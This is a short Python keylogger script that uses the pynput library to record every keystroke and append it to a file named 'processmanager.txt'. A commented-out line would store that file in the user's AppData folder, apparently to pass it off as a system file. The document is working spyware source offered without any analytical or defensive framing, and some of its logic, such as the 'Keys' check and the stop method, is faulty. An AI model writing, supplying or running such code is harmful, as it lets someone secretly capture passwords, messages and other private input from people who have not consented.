import os
from pynput.keyboard import Listener

class keylog:
    def __init__(self):
        self.keys = [] #keys stored
        self.count = 0 #tracking of keys
        #path = os.environ['appdata'] + \\processmanager.txt
        self.path = 'processmanager.txt'
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self,key):
        self.keys.append(key)
        self.count +=1
        if self.count >=1:
            self.count =0 #reset the count
            self.write_file(self.keys) #storing the keys
            self.keys = []

    def write_file(self,keys):
        with open(self.path,'a') as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find('backspace')>0:
                    f.write(' Backspace ') #123 backspace that means it reased
                elif k.find('enter') >0:
                    f.write('\n')
                elif k.find('shift') >0:
                    f.write(' Shift ')
                elif k.find('space') >0:
                    f.write(' ')
                elif k.find('caps_lock') >0:
                    f.write(' caps_lock ')
                elif k.find('Keys'):
                    f.write(k)

    def stop(self):
        if KeyboardInterrupt:
            quit(0)

